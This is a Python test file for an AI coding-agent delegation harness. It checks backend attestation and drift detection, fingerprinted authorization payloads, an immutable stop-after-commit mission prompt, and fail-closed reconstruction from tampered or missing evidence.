def test_where_matching_stdout_stderr_hash_changes_do_not_change_backend_or_payload(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    path = str(root / "cursor-agent.cmd")
    source = tmp_path / "source"; source.mkdir()
    first, first_diag = _attest_wrapper_chain_cursor_observed(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, where_stdout=(path + "\n").encode(), where_stderr=b"first"),
    )
    second, second_diag = _attest_wrapper_chain_cursor_observed(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, where_stdout=(path + "\r\n").encode(), where_stderr=b"second"),
    )
    assert first_diag.status is second_diag.status is WindowsWhereDiagnosticStatus.MATCHING_RESULT
    assert first_diag.stdout_sha256 != second_diag.stdout_sha256
    assert first_diag.stderr_sha256 != second_diag.stderr_sha256
    assert first == second
    payload_one = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
        attestation=first, run_root=tmp_path / "future-run", timeout_seconds=900,
    )
    payload_two = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
        attestation=second, run_root=tmp_path / "future-run", timeout_seconds=900,
    )
    assert payload_one == payload_two


def test_successful_contradictory_where_result_blocks(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    contradictory = elsewhere / "cursor-agent.cmd"; contradictory.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    with pytest.raises(ValueError, match="where.exe result contradicts"):
        _attest_wrapper_chain_cursor(
            _WRAPPER_CONFIG,
            discovery=FakeWrapperChainDiscovery(root, where=(str(contradictory),), where_exit_code=0),
        )


def test_preflight_only_review_output_exposes_separate_where_diagnostic(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    source_parent = tmp_path / "source-parent"; source_parent.mkdir()
    source = build_canary_repository(source_parent, repository_name="source").repository
    head = _command(["git", "rev-parse", "HEAD"], cwd=source).stdout.strip()
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    _same_attestation, diagnostic = _attest_wrapper_chain_cursor_observed(_WRAPPER_CONFIG, discovery=discovery)
    decision = NativePreflightDecision(
        NativePreflightStatus.PREFLIGHT_READY, WRAPPER_CHAIN_READY_REASON,
        "synthetic deterministic review", attestation, diagnostic,
    )
    monkeypatch.setattr("admissible.delegated_gate.native_canary.preflight_native_cursor", lambda *, config: decision)
    run_root = tmp_path / "review-run"
    args = [
        "--source-repository", str(source), "--required-source-head", head,
        "--run-root", str(run_root), "--run-id", "review-run", "--session-id", "review-run",
        "--executable", "cursor-agent", "--attestation-class", "wrapper-chain",
        "--model", "auto", "--timeout-seconds", "900", "--preflight-only",
    ]
    assert main(args) == 0
    emitted = json.loads(capsys.readouterr().out)
    assert emitted["where_diagnostic"] == diagnostic.to_dict()
    assert emitted["attestation"] == attestation.to_dict()
    assert not run_root.exists()


def test_wrapper_v1_is_inert_even_when_refingerprinted_and_v2_round_trips(tmp_path: Path):
    source = tmp_path / "source"; source.mkdir()
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    assert attestation.schema_version == WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION
    assert attestation_from_dict(attestation.to_dict()) == attestation
    legacy = attestation.to_dict()
    legacy["schema_version"] = WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION_LEGACY_V1
    legacy["attestation_fingerprint"] = fingerprint({
        key: value for key, value in legacy.items() if key != "attestation_fingerprint"
    })
    with pytest.raises(ValueError, match="legacy wrapper-chain v1.*inert"):
        attestation_from_dict(legacy)
    legacy_object = replace(
        attestation, schema_version=WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION_LEGACY_V1,
        attestation_fingerprint=legacy["attestation_fingerprint"],
    )
    with pytest.raises(ValueError, match="unsupported wrapper-chain"):
        legacy_object.validated()
    with pytest.raises(ValueError, match="unsupported wrapper-chain"):
        build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
            attestation=legacy_object, run_root=tmp_path / "future-run", timeout_seconds=900,
        )


def test_prior_wrapper_v1_payload_non_claim_shape_is_invalid_even_when_refingerprinted(tmp_path: Path):
    source = tmp_path / "source"; source.mkdir()
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    payload = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
        attestation=attestation, run_root=tmp_path / "future-run", timeout_seconds=900,
    )
    prior = payload.to_dict()
    prior["attestation_non_claims"] = list(WRAPPER_CHAIN_NON_CLAIMS[:-2])
    prior["payload_fingerprint"] = fingerprint({key: value for key, value in prior.items() if key != "payload_fingerprint"})
    with pytest.raises(ValueError, match="non-claims"):
        NativeCanaryAuthorizationPayload.from_dict(prior)


# --- Act 2A.3G: immutable mission stop-after-commit binding ----------------

_ACT_2A_3G_MISSION = """Add deterministic high-score persistence to this small game-state package.
Implement the feature across the existing source modules, add tests using the existing Node test runner,
run the complete npm test suite, update the README, and create one local Git commit with the exact message
`feat: add deterministic high-score persistence`. Do not add a remote and do not push. Stop after the local commit."""
_ACT_2A_3G_MISSION_FINGERPRINT = "1a296853942d359647a12fe7875bac32898690a1fafd16c8d02993c471ae687e"
_ACT_2A_3G_GATE_PLAN_FINGERPRINT = "fdde35a25b3f88d87474b7ba6dabd0c3cbb1134bac9269b7ae3dafd810d0ddbf"
_ACT_2A_GATE_CONTRACT_FINGERPRINT = "603d7a09d4a3ce48f5ad21b2d754b6c7a946f6fcc88d9337d3f516c8f2312379"


def test_act_2a_3g_immutable_mission_plan_and_prompt_bind_stop_clause(tmp_path: Path):
    h = _harness(tmp_path)
    state = create_canary_session(session_id="act-2a-3g-mission-binding")
    prompt = build_native_agent_prompt(
        mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work,
    )
    request, request_prompt = _request(h)

    assert CANARY_MISSION == _ACT_2A_3G_MISSION
    assert CANARY_MISSION.endswith("Stop after the local commit.")
    assert len(CANARY_MISSION.encode("utf-8")) == 402 != 373
    assert state.mission.specification == _ACT_2A_3G_MISSION
    assert state.mission.mission_fingerprint == _ACT_2A_3G_MISSION_FINGERPRINT
    assert state.mission.mission_fingerprint != "f663f7e63d51c503ce9712544c0026874ce05931452e63b3c04431a4aa457726"
    assert state.gate_plan.immutable_mission_fingerprint == _ACT_2A_3G_MISSION_FINGERPRINT
    assert state.gate_plan.plan_fingerprint == _ACT_2A_3G_GATE_PLAN_FINGERPRINT
    assert state.gate_plan.plan_fingerprint != "d433560c437fe2f7744c46dfc44913feb39fd7dab566e8957779d3fdc6db9600"
    assert state.current_gate.contract_fingerprint == _ACT_2A_GATE_CONTRACT_FINGERPRINT
    assert f"Immutable mission:\n{_ACT_2A_3G_MISSION}\n\nCurrent gate objective:" in prompt
    assert prompt.count("Stop after the local commit.") == 1
    assert "- use no `--trailer`" in prompt
    assert "`Co-authored-by`, sign-off, attribution, or other trailer" in prompt
    assert "git log -1 --format=%B" in prompt
    assert "amend that same commit" in prompt and "do not create a second commit" in prompt
    assert "- stop immediately only after the exact full-message verification passes." in prompt
    assert request_prompt == build_native_agent_prompt(
        mission=h.session_store.load(h.session_id).mission,
        gate_contract=h.session_store.load(h.session_id).current_gate,
        work_workspace=h.work,
    )
    assert request.prompt_fingerprint == hashlib.sha256(request_prompt.encode("utf-8")).hexdigest()
    assert (MAX_PROVIDER_INVOCATIONS, MAX_NATIVE_PHASE_ATTEMPTS, MAX_REPAIR_ROUNDS, MAX_AUDITOR_INVOCATIONS, MAX_RETRIES) == (1, 1, 0, 0, 0)


def test_act_2a_3g_corrected_payload_cannot_match_invalidated_act_2a_3f_vector(tmp_path: Path):
    h = _harness(tmp_path)
    payload = build_authorization_payload(
        source_repository=h.source,
        source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(),
        run_id="act-2a-3g-preview", session_id="act-2a-3g-preview",
        attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30,
    )
    canonical_payload = _canonical_bytes(payload.to_dict())

    assert payload.mission_fingerprint == _ACT_2A_3G_MISSION_FINGERPRINT
    assert payload.gate_plan_fingerprint == _ACT_2A_3G_GATE_PLAN_FINGERPRINT
    assert payload.gate_contract_fingerprint == _ACT_2A_GATE_CONTRACT_FINGERPRINT
    assert payload.payload_fingerprint != "a6f4340ce0e3acfcdb63f1455de8d753de412a8fffa3f2531bf08e57d9b3e28e"
    assert hashlib.sha256(canonical_payload).hexdigest() != "f0c83a2634f853bea66afe8c2b8f161e9374c3d717180499b8c652c935c9f311"


# --- Act 2A.4B: evidence-only reconstruction of a completed success ----------


class _LiveCapabilityTrap(AssertionError):
    """Raised when a booby-trapped live capability is invoked."""


def _trap_capability(label: str) -> Callable[..., object]:
    def _fire(*_args: object, **_kwargs: object) -> object:
        raise _LiveCapabilityTrap(f"{label} invoked during evidence-only reconstruction")
    return _fire


class _TrapProcessRunner:
    def run(self, invocation: NativeProcessInvocation) -> NativeProcessOutcome:
        raise _LiveCapabilityTrap("native process runner invoked during evidence-only reconstruction")


class _InertStubAttestation:
    """Constructor stand-in proving reconstruction never uses a live attestation."""

    def validated(self) -> "_InertStubAttestation":
        return self


def _force_rmtree(root: Path) -> None:
    def _grant(func, path, _exc):
        os.chmod(path, stat.S_IWRITE); func(path)
    shutil.rmtree(root, onerror=_grant)


def _tree_hashes(root: Path) -> dict[str, str]:
    return {str(p.relative_to(root)): hashlib.sha256(p.read_bytes()).hexdigest() for p in sorted(root.rglob("*")) if p.is_file()}


def _rewrite_record(path: Path, mutate: Callable[[dict], None], *, self_fingerprint: str | None) -> None:
    from admissible.delegated_gate.canonical import canonical_bytes
    raw = json.loads(path.read_text(encoding="utf-8"))
    mutate(raw)
    if self_fingerprint is not None:
        raw[self_fingerprint] = fingerprint({key: value for key, value in raw.items() if key != self_fingerprint})
    path.write_bytes(canonical_bytes(raw) + b"\n")


def _evidence_only_coordinator(h: Harness, monkeypatch: pytest.MonkeyPatch, *, source: Path | None = None) -> NativeCanaryCoordinator:
    """A restarted coordinator in which every live capability is a trap."""

    monkeypatch.setattr("admissible.delegated_gate.native_canary.run_behavioral_verifier", _trap_capability("behavioral verifier"))
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint", _trap_capability("checkpoint capture"))
    executor = NativeDelegatedExecutor(config=h.config, process_runner=_TrapProcessRunner(), local_attestor=_trap_capability("local backend attestor"))
    return NativeCanaryCoordinator(
        session_store=AtomicDelegatedSessionStore(h.session_store.directory),
        execution_store=AtomicNativeExecutionStore(h.store.directory),
        executor=executor, backend_attestation=_InertStubAttestation(),
        source_repository=source if source is not None else h.source, work_workspace=h.work,
        canary_parent=h.root, evidence_directory=h.evidence,
        timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048,
    )


def _repository_internals(repository: Path) -> dict[str, tuple[bytes, int, int]]:
    """Exact bytes, size, and nanosecond mtime for the disposable repository."""

    return {
        path.relative_to(repository).as_posix(): (path.read_bytes(), path.stat().st_size, path.stat().st_mtime_ns)
        for path in sorted(repository.rglob("*")) if path.is_file()
    }


def test_git_forces_optional_locks_off_only_for_its_child(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    repository = tmp_path / "repository"; repository.mkdir()
    observed: dict[str, object] = {}

    def capture(*args: object, **kwargs: object) -> subprocess.CompletedProcess[str]:
        observed["command"] = args[0]
        observed.update(kwargs)
        return subprocess.CompletedProcess(args[0], 0, "ok\n", "")

    monkeypatch.setenv("GIT_OPTIONAL_LOCKS", "1")
    monkeypatch.setenv("NATIVE_GIT_INHERITED_TEST", "preserved")
    monkeypatch.setattr(native_executor.subprocess, "run", capture)
    assert native_executor._git(repository, "status", "--porcelain", timeout=17).stdout == "ok\n"
    assert observed["env"]["GIT_OPTIONAL_LOCKS"] == "0"
    assert observed["env"]["NATIVE_GIT_INHERITED_TEST"] == "preserved"
    assert os.environ["GIT_OPTIONAL_LOCKS"] == "1"
    assert observed["command"] == ["git", "status", "--porcelain"]
    assert observed["cwd"] == repository and observed["timeout"] == 17
    assert observed["shell"] is False and observed["capture_output"] is True


def test_git_observation_does_not_refresh_disposable_index(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    monkeypatch.delenv("GIT_OPTIONAL_LOCKS", raising=False)
    repository = tmp_path / "repository"; repository.mkdir()
    _command(["git", "init", "--quiet"], cwd=repository)
    tracked = repository / "tracked.txt"; tracked.write_text("unchanged\n", encoding="utf-8")
    _commit(repository, "initial")
    # Change only the worktree stat information, the condition under which Git
    # may refresh a clean index entry.  Production observation must not do so.
    old = tracked.stat(); os.utime(tracked, ns=(old.st_atime_ns, old.st_mtime_ns + 2_000_000_000))
    before = _repository_internals(repository)
    result = native_executor._git(repository, "status", "--porcelain=v1", "--untracked-files=all")
    assert result.returncode == 0 and result.stdout == ""
    assert _repository_internals(repository) == before


def test_checkpoint_captured_success_reconstruction_is_evidence_only(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    h = _harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    before = _tree_hashes(h.evidence)
    outcome = _evidence_only_coordinator(h, monkeypatch).run(session_id=h.session_id)
    result = h.store.load_result(h.session_id, CANARY_GATE_ID, 0)
    behavioral = load_behavioral_verifier(request=h.store.load_request_structural(h.session_id, CANARY_GATE_ID, 0), execution_store=h.store)
    attempt = h.store.load_capture_attempt(h.session_id, CANARY_GATE_ID, 0)
    state = h.session_store.load(h.session_id)
    assert outcome.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and outcome.canary_success
    assert (outcome.native_attempts_reserved, outcome.native_processes_started, outcome.native_processes_completed, outcome.process_observations_published, outcome.accepted_native_results_published, outcome.provider_invocations) == (1, 1, 1, 1, 1, 1)
    assert outcome.request_fingerprint == result.request_fingerprint and outcome.result_fingerprint == result.result_fingerprint
    assert outcome.behavioral_evidence_fingerprint == behavioral.evidence_fingerprint
    assert outcome.capture_attempt_fingerprint == attempt.attempt_fingerprint
    assert outcome.checkpoint_fingerprint == state.checkpoint_history[-1].checkpoint_fingerprint
    assert outcome.workspace_final_git_head == result.final_git_head and outcome.phase == Phase.CHECKPOINT_CAPTURED.value
    assert len(h.runner.invocations) == 1
    assert _tree_hashes(h.evidence) == before
    assert not tuple(h.store.directory.glob("*.attempt-1.*")) and not h.store.has_terminal(h.session_id, CANARY_GATE_ID, 0)


def test_completed_success_survives_changed_or_absent_backend_and_source(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    h = _harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    (h.source / "advance.txt").write_text("post-canary source work\n", encoding="utf-8")
    _commit(h.source, "chore: advance source HEAD")
    restarted = _evidence_only_coordinator(h, monkeypatch)
    _force_rmtree(tmp_path / "injected-test-installation")
    _force_rmtree(h.source)
    outcome = restarted.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.CHECKPOINT_CAPTURED_CANARY_SUCCESS and outcome.canary_success
    assert len(h.runner.invocations) == 1
    assert not h.store.has_terminal(h.session_id, CANARY_GATE_ID, 0)


def _delete_record(kind: str) -> Callable[[Harness], None]:
    def _mutate(h: Harness) -> None:
        h.store._path(kind, h.session_id, CANARY_GATE_ID, 0).unlink()
    return _mutate


def _tamper_record(kind: str, mutate: Callable[[dict], None], *, self_fingerprint: str | None) -> Callable[[Harness], None]:
    def _apply(h: Harness) -> None:
        _rewrite_record(h.store._path(kind, h.session_id, CANARY_GATE_ID, 0), mutate, self_fingerprint=self_fingerprint)
    return _apply


def _tamper_state(mutate: Callable[[dict], None]) -> Callable[[Harness], None]:
    def _apply(h: Harness) -> None:
        _rewrite_record(h.session_store.directory / f"{h.session_id}.delegated-gate.json", mutate, self_fingerprint="state_fingerprint")
    return _apply


def _eligibility_recorded_false(raw: dict) -> None:
    raw["process_status_eligible"] = False
    raw["eligible"] = False
    raw["ineligibility_reasons"] = ["native_process_or_cleanup_ineligible"]


def _advance_workspace_head(h: Harness) -> None:
    (h.work / "advance.js").write_text("// post-success mutation\n", encoding="utf-8")
    _commit(h.work, "chore: post-success mutation")


def _dirty_workspace(h: Harness) -> None:
    (h.work / "untracked.txt").write_text("dirty\n", encoding="utf-8")


_EVIDENCE_TAMPER_CASES = [
    ("missing-request", _delete_record("request")),
    ("malformed-request", lambda h: h.store._path("request", h.session_id, CANARY_GATE_ID, 0).write_bytes(b"{not canonical json\n")),
    ("request-fingerprint-mismatch", _tamper_record("request", lambda raw: raw.__setitem__("request_fingerprint", "0" * 64), self_fingerprint=None)),
    ("missing-reservation", _delete_record("attempt-reserved")),
    ("missing-process-start", _delete_record("process-started")),
    ("missing-observation", _delete_record("process-observation")),
    ("eligibility-recorded-false", _tamper_record("execution-eligibility", _eligibility_recorded_false, self_fingerprint="eligibility_fingerprint")),
    ("eligibility-fingerprint-mismatch", _tamper_record("execution-eligibility", lambda raw: raw.__setitem__("eligibility_fingerprint", "1" * 64), self_fingerprint=None)),
    ("missing-result", _delete_record("result")),
    ("result-fingerprint-mismatch", _tamper_record("result", lambda raw: raw.__setitem__("result_fingerprint", "2" * 64), self_fingerprint=None)),
    ("missing-behavioral", _delete_record("behavioral")),
    ("behavioral-fingerprint-mismatch", _tamper_record("behavioral", lambda raw: raw.__setitem__("evidence_fingerprint", "3" * 64), self_fingerprint=None)),
    ("missing-capture-attempt", _delete_record("capture-attempt")),
    ("capture-result-binding-mismatch", _tamper_record("capture-attempt", lambda raw: raw.__setitem__("result_fingerprint", "4" * 64), self_fingerprint="attempt_fingerprint")),
    ("state-missing-checkpoint", _tamper_state(lambda raw: raw.__setitem__("checkpoint_history", []))),
    ("state-checkpoint-fingerprint-mismatch", _tamper_state(lambda raw: raw["checkpoint_history"][0].__setitem__("checkpoint_fingerprint", "5" * 64))),
    ("state-revision-incorrect", _tamper_state(lambda raw: raw.__setitem__("revision", 7))),
    ("workspace-head-advanced", _advance_workspace_head),
    ("workspace-dirty", _dirty_workspace),
]


@pytest.mark.parametrize(("case", "mutate"), _EVIDENCE_TAMPER_CASES, ids=[case for case, _ in _EVIDENCE_TAMPER_CASES])
def test_evidence_only_reconstruction_fails_closed_on_tampered_or_missing_evidence(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, case: str, mutate: Callable[[Harness], None]):
    from admissible.delegated_gate.store import DelegatedGateStoreError
    h = _harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    mutate(h)
    restarted = _evidence_only_coordinator(h, monkeypatch)
    with pytest.raises((NativeExecutionStoreError, DelegatedGateStoreError)):
        restarted.run(session_id=h.session_id)
    assert len(h.runner.invocations) == 1
    assert not tuple(h.store.directory.glob("*.attempt-1.*"))
    assert not h.store.has_terminal(h.session_id, CANARY_GATE_ID, 0)


def test_contradictory_terminal_over_completed_success_is_recognized_never_success(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    h = _harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success
    h.store.create_terminal(
        request=h.store.load_request_structural(h.session_id, CANARY_GATE_ID, 0),
        result=h.store.load_result(h.session_id, CANARY_GATE_ID, 0),
        status=NativeCaptureTerminalStatus.CAPTURE_FAILED,
        failure_category="checkpoint_capture", diagnostic="synthetic contradictory terminal for fail-closed testing",
    )
    outcome = _evidence_only_coordinator(h, monkeypatch).run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.CHECKPOINT_CAPTURE_FAILED and not outcome.canary_success
    assert len(h.runner.invocations) == 1
    assert not tuple(h.store.directory.glob("*.attempt-1.*"))


# --- ACP_STDIO backend drift observation ------------------------------------
#
# Regression cover for the authorized Neon Relay V2 run, which reserved its
# single native attempt, spawned a real ACP provider for ~10 minutes and then
# raised ``AttributeError: 'AcpStdioBackendAttestation' object has no attribute
# 'provenance'`` inside ``_observe_backend_drift``.  The drift observer branched
# on ``WrapperChainBackendAttestation`` and duck-typed *everything else* as the
# package-bin class, so the ACP class fell into a branch that cannot describe it.

from admissible.delegated_gate.native_executor import (
    ACP_SUBCOMMAND,
    ATTESTATION_CLASS_ACP_STDIO,
    AcpStdioBackendAttestation,
    PROMPT_TRANSPORT_ACP_STDIO,
    PROMPT_TRANSPORT_ARGV,
    _attest_acp_stdio_cursor_observed,
    _observe_backend_drift,
    _wrapper_chain_command_authority,
)

_ACP_CONFIG = CursorNativeBackendConfig(executable="cursor-agent", attestation_class=ATTESTATION_CLASS_ACP_STDIO)


def _acp_attestor(discovery: FakeWrapperChainDiscovery):
    return lambda config: _attest_acp_stdio_cursor_observed(config, discovery=discovery)[0]


def _acp_attestation(tmp_path: Path) -> tuple[Path, FakeWrapperChainDiscovery, AcpStdioBackendAttestation]:
    root = _wrapper_chain_installation(tmp_path)
    discovery = FakeWrapperChainDiscovery(root)
    return root, discovery, _acp_attestor(discovery)(_ACP_CONFIG)


def _acp_harness(tmp_path: Path, *, runner: FakeNativeProcessRunner | None = None) -> tuple[Harness, FakeWrapperChainDiscovery]:
    source_parent = tmp_path / "source-parent"; source_parent.mkdir(); source = build_canary_repository(source_parent, repository_name="source").repository
    root = tmp_path / "run"; root.mkdir(); work = build_canary_repository(root).repository; evidence = root / "evidence"; evidence.mkdir()
    discovery = FakeWrapperChainDiscovery(_wrapper_chain_installation(tmp_path))
    attestor = _acp_attestor(discovery)
    attestation = attestor(_ACP_CONFIG)
    fake = runner or FakeNativeProcessRunner(); store = AtomicNativeExecutionStore(evidence / "native-execution"); session_store = AtomicDelegatedSessionStore(evidence / "delegated-state")
    session_id = "acp-stdio-session"; session_store.create(create_canary_session(session_id=session_id))
    executor = NativeDelegatedExecutor(config=_ACP_CONFIG, process_runner=fake, clock=Clock(), local_attestor=attestor)
    coordinator = NativeCanaryCoordinator(session_store=session_store, execution_store=store, executor=executor, backend_attestation=attestation, source_repository=source, work_workspace=work, canary_parent=root, evidence_directory=evidence, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048)
    return Harness(root, source, work, evidence, _ACP_CONFIG, attestation, fake, store, session_store, executor, coordinator, session_id), discovery


def _post_run_chain(discovery: FakeWrapperChainDiscovery) -> WrapperChainBackendAttestation | None:
    """The nested command-resolution authority a post-run refresh supplies.

    ``None`` when the live installation can no longer be attested at all, which
    is exactly what ``execute`` records when its refresh raises.
    """

    try:
        return _wrapper_chain_command_authority(_acp_attestor(discovery)(_ACP_CONFIG))
    except (OSError, ValueError, NativeEvidenceInvalid):
        return None


# --- the exact former traceback ---------------------------------------------


def test_acp_attestation_has_no_provenance_and_the_former_drift_expression_raised(tmp_path: Path):
    """Pin the historical defect: the observed expression, on the observed type."""

    _, discovery, attestation = _acp_attestation(tmp_path)
    assert isinstance(attestation, AcpStdioBackendAttestation)
    assert not isinstance(attestation, (NativeBackendAttestation, WrapperChainBackendAttestation))
    assert not hasattr(attestation, "provenance")
    with pytest.raises(AttributeError) as exc:
        attestation.provenance.discovered_shim  # the exact former drift-observation access
    assert "provenance" in str(exc.value)
    # The repaired observer traverses the same object without touching it.
    drift = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert drift.clean and "pinned_executable:NO_DRIFT" in drift.diagnostics


def test_unchanged_acp_attestation_passes_drift_observation(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    drift = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert drift.clean and drift.post_run_eligible and not drift.blocking_diagnostics
    assert (drift.executable, drift.command_resolution, drift.catalog, drift.selected_version) == ("NO_DRIFT", "NO_DRIFT", "NO_DRIFT", "NO_DRIFT")
    assert drift.launchers == ("NO_DRIFT",)
    # Both authorities are exercised: the nested chain's material facts and the
    # ACP layer the chain cannot express.
    assert {item.split(":", 1)[0] for item in drift.diagnostics} >= {
        "cmd_wrapper", "powershell_wrapper", "selected_package_manifest", "command_resolution",
        "version_inventory", "selected_version", "acp_attestation_class", "acp_prompt_transport",
        "acp_static_argv", "acp_wrapper_chain_binding", "acp_prompt_binding_policy",
        "acp_attestation_fingerprint",
    }
    assert all(item.rsplit(":", 1)[-1] == "NO_DRIFT" for item in drift.diagnostics if item.startswith("acp_"))


def test_acp_drift_authority_is_both_the_acp_layer_and_its_nested_wrapper_chain(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    assert _wrapper_chain_command_authority(attestation) is attestation.wrapper_chain
    chain_only = _observe_backend_drift(attestation.wrapper_chain, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    acp = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    # The ACP view is the chain view plus, and only plus, the ACP layer.
    assert acp.wrappers[: len(chain_only.wrappers)] == chain_only.wrappers
    assert acp.diagnostics[: len(chain_only.diagnostics)] == chain_only.diagnostics
    # Five transport dimensions, the derived Windows shell-folder authority, and
    # the body fingerprint.
    assert len(acp.wrappers) == len(chain_only.wrappers) + 7


# --- refusals: live installation material ------------------------------------


def test_changed_node_identity_is_refused(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    executable = Path(attestation.executable.canonical_path)
    executable.write_bytes(executable.read_bytes() + b"x")
    drift = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert drift.executable == "CONTENT_DRIFT" and not drift.clean and not drift.post_run_eligible
    assert "pinned_executable:CONTENT_DRIFT" in drift.blocking_diagnostics


def test_changed_index_js_identity_is_refused(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    launcher = Path(attestation.launcher_prefix[0].canonical_path)
    launcher.write_bytes(launcher.read_bytes() + b"// drift\n")
    drift = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert drift.launchers == ("CONTENT_DRIFT",) and not drift.clean
    assert "pinned_launcher_0:CONTENT_DRIFT" in drift.blocking_diagnostics


def test_changed_selected_version_is_refused(tmp_path: Path):
    root, discovery, attestation = _acp_attestation(tmp_path)
    (root / "versions" / "2026.08.01-cafecafe").mkdir()  # strictly newer than the attested selection
    drift = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert drift.selected_version == "SELECTED_VERSION_DRIFT" and not drift.clean
    assert "selected_version:SELECTED_VERSION_DRIFT" in drift.blocking_diagnostics
    # A selection the live installation cannot even attest never downgrades to a
    # clean command-resolution comparison.
    assert _post_run_chain(discovery) is None and drift.command_resolution == "UNREADABLE"


def test_changed_version_inventory_alone_is_refused(tmp_path: Path):
    root, discovery, attestation = _acp_attestation(tmp_path)
    (root / "versions" / "2026.01.01-0000000").mkdir()  # older: inventory moves, selection does not
    drift = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert drift.catalog == "VERSION_INVENTORY_DRIFT" and drift.selected_version == "NO_DRIFT"
    assert not drift.clean and "version_inventory:VERSION_INVENTORY_DRIFT" in drift.blocking_diagnostics


def test_changed_path_command_resolution_authority_is_refused(tmp_path: Path):
    root, discovery, attestation = _acp_attestation(tmp_path)
    earlier = tmp_path / "acp-earlier-path"; earlier.mkdir()
    discovery.path = _path_value(earlier, root, "C:\\Windows")
    drift = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert drift.command_resolution == "IDENTITY_ONLY_DRIFT" and not drift.clean
    assert "command_resolution:IDENTITY_ONLY_DRIFT" in drift.blocking_diagnostics


def test_absent_post_run_command_resolution_authority_is_refused(tmp_path: Path):
    _, _, attestation = _acp_attestation(tmp_path)
    drift = _observe_backend_drift(attestation)
    assert drift.command_resolution == "UNREADABLE" and not drift.clean
    assert "command_resolution:UNREADABLE" in drift.blocking_diagnostics


# --- refusals: the ACP layer itself ------------------------------------------


def _tampered(attestation: AcpStdioBackendAttestation, **changes: object) -> AcpStdioBackendAttestation:
    """A structurally-invalid ACP attestation the drift observer must classify.

    ``validated()`` refuses these at parse time; drift observation must classify
    rather than raise so an already-published observation is never lost.
    """

    return replace(attestation, **changes)


def test_changed_prompt_transport_is_refused(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    drift = _observe_backend_drift(
        _tampered(attestation, prompt_transport=PROMPT_TRANSPORT_ARGV),
        post_run_wrapper_chain_attestation=_post_run_chain(discovery),
    )
    assert "acp_prompt_transport:CONTENT_DRIFT" in drift.blocking_diagnostics
    assert not drift.clean and not drift.post_run_eligible


def test_changed_static_acp_argv_is_refused(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    chain = attestation.wrapper_chain
    for template in (
        (chain.executable.canonical_path, chain.launcher_prefix[0].canonical_path, "chat"),
        (chain.executable.canonical_path, chain.launcher_prefix[0].canonical_path),
        (chain.executable.canonical_path, chain.launcher_prefix[0].canonical_path, ACP_SUBCOMMAND, "{prompt}"),
    ):
        drift = _observe_backend_drift(
            _tampered(attestation, static_argv_template=template),
            post_run_wrapper_chain_attestation=_post_run_chain(discovery),
        )
        assert "acp_static_argv:CONTENT_DRIFT" in drift.blocking_diagnostics and not drift.clean


def test_acp_restating_its_chains_launcher_or_version_facts_is_refused(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    for changes in (
        {"selected_version": "2099.12.31-ffffffff"},
        {"version_inventory": ("2099.12.31-ffffffff",)},
        {"selected_version_root": str(tmp_path / "elsewhere")},
        {"selected_model": "some-other-model"},
        {"environment_allowlist": ("PATH",)},
    ):
        drift = _observe_backend_drift(
            _tampered(attestation, **changes), post_run_wrapper_chain_attestation=_post_run_chain(discovery),
        )
        assert "acp_wrapper_chain_binding:CONTENT_DRIFT" in drift.blocking_diagnostics


